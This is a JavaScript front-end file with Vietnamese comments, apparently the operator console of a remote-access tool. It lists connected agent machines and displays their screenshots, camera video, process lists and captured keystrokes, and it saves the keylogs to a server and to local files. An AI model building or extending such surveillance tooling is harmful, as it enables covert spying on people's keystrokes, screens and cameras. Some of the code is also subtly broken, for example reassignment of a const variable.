import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';

const urlParams = new URLSearchParams(window.search);
const targetParam = urlParams.get('target');

if (targetParam) {
    setTimeout(() => {
        window.setTarget(targetParam);
        ui.log("System", "Đã tự động kết nối tới Agent từ tab mới");
    }, 2000);
}

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    currentTarget: 'ALL'
};

const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00; font-family: monospace;'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000; font-weight: bold;'),
    warn: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ffff00;'),
    info: (msg) => console.log(`%c${msg}`, 'color: cyan; font-weight: bold;'),
    updateAgentList: (agents) => {
        console.group("=== DANH SÁCH AGENT ONLINE ===");
        console.table(agents);
        console.groupEnd();
    },
    renderList: (title, data) => {
        console.group(`=== ${title} ===`);
        console.table(data);
        console.groupEnd();
    }
};

// Export gateway để scripts.js có thể sử dụng
window.gateway = new Gateway({
    onAgentListUpdate: (agentList) => {
        appState.agents = agentList;
        renderAgentTabs();
        ui.updateAgentList(gateway.getFormattedAgents());
        
        // Cập nhật dashboard nếu đang mở (chỉ khi overlay đang visible)
        if (typeof window.fetchAndRenderServers === 'function') {
            const overlay = document.getElementById('server-list-overlay');
            if (overlay && !overlay.classList.contains('hidden')) {
                window.fetchAndRenderServers();
            }
        }
    },
    onScreenshot: (base64Data, agentId) => {
        const container = document.getElementById('preview-area');
        if (!container) {
            // Create preview area if it doesn't exist
            const body = document.body;
            container = document.createElement('div');
            container.id = 'preview-area';
            container.style.cssText = 'padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;';
            body.appendChild(container);
        }
        
        const timestamp = new Date().toLocaleString('vi-VN');
        const wrapper = document.createElement('div');
        wrapper.className = 'preview-item';
        wrapper.style.cssText = 'border: 2px solid #4CAF50; border-radius: 8px; padding: 10px; background: #f5f5f5; box-shadow: 0 2px 4px rgba(0,0,0,0.1);';
        wrapper.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <strong style="color: #2196F3;">📷 Screenshot từ ${agentId}</strong>
                <span style="font-size: 0.8em; color: #666;">${timestamp}</span>
            </div>
            <img src="data:image/jpeg;base64,${base64Data}" 
                 style="width:100%; border-radius: 4px; cursor:pointer; transition: transform 0.2s;" 
                 onclick="window.open(this.src, '_blank')"
                 onmouseover="this.style.transform='scale(1.02)'"
                 onmouseout="this.style.transform='scale(1)'"
                 alt="Screenshot">
            <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 10px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Xóa</button>
        `;
        container.prepend(wrapper);
    },
    onCamera: (videoData, agentId) => {
        const container = document.getElementById('preview-area');
        if (!container) {
            // Create preview area if it doesn't exist
            const body = document.body;
            container = document.createElement('div');
            container.id = 'preview-area';
            container.style.cssText = 'padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;';
            body.appendChild(container);
        }
        
        const timestamp = new Date().toLocaleString('vi-VN');
        const wrapper = document.createElement('div');
        wrapper.className = 'preview-item';
        wrapper.style.cssText = 'border: 2px solid #FF9800; border-radius: 8px; padding: 10px; background: #f5f5f5; box-shadow: 0 2px 4px rgba(0,0,0,0.1);';
        wrapper.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <strong style="color: #FF9800;">🎥 Video từ ${agentId}</strong>
                <span style="font-size: 0.8em; color: #666;">${timestamp}</span>
            </div>
            <video src="data:video/mp4;base64,${videoData}" 
                   controls 
                   style="width:100%; border-radius: 4px; background: #000;"
                   preload="metadata">
                Trình duyệt của bạn không hỗ trợ video.
            </video>
            <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 10px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Xóa</button>
        `;
        container.prepend(wrapper);
    },
    onKeylog: (keyData, agentId) => {
        const panel = document.getElementById('keylog-panel');
        if (panel) {
            panel.value += keyData;
            panel.scrollTop = panel.scrollHeight;
        }
    }
});

window.searchApps = (query) => {
    if (query) {
        gateway.fetchAppList(query);
    } else {
        gateway.fetchAppList();
    }
};

window.searchProcs = (query) => {
    if (query) {
        gateway.fetchProcessList(query);
    } else {
        gateway.fetchProcessList();
    }
};

// Display app/process lists on screen
window.displayAppList = () => {
    gateway.fetchAppList();
};

window.displayProcessList = () => {
    gateway.fetchProcessList();
};

window.saveKeylogToFile = () => {
    const panel = document.getElementById('keylog-panel');
    if (!panel || !panel.value.trim()) {
        ui.warn('Keylog', 'Không có dữ liệu keylog để lưu');
        return;
    }

    const keylogData = panel.value;
    
    // Send to server to save
    gateway.send(CONFIG.CMD.SAVE_KEYLOG, { data: keylogData });
    
    // Also download locally as backup
    const blob = new Blob([keylogData], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `keylog_${appState.currentTarget}_${Date.now()}.txt`;
    link.click();
    URL.revokeObjectURL(url);
    
    // Clear the panel
    panel.value = "";
    ui.log('Keylog', 'Đã lưu keylog và xóa dữ liệu trên màn hình');
};

window.renderAgentTabs = () => {
    const container = document.getElementById('agent-selector-ui');
    if (!container) return;
    
    container.innerHTML = "";
    const agents = gateway.getFormattedAgents();
    
    agents.forEach(agent => {
        const item = document.createElement('div');
        item.className = 'agent-link';
        item.style.cursor = 'pointer';
        item.innerHTML = `<span>${agent["Machine"]} (${agent["IP Address"]})</span>`;
        item.onclick = () => {
            const targetUrl = `${window.location.origin}${window.location.pathname}?agent=${agent["ID"]}`;
            window.open(targetUrl, '_blank');
        };
        container.appendChild(item);
    });
};

document.addEventListener('DOMContentLoaded', () => {
    // Tự động connect đến gateway
    if (!gateway.isAuthenticated) {
        gateway.connect(CONFIG.SERVER_HOST, CONFIG.SERVER_PORT);
    }
    
    const params = new URLSearchParams(window.location.search);
    const autoAgent = params.get('agent');
    
    if (autoAgent) {
        const checkInterval = setInterval(() => {
            if (gateway.isAuthenticated) {
                window.setTarget(autoAgent);
                clearInterval(checkInterval);
            }
        }, 500);
    }
});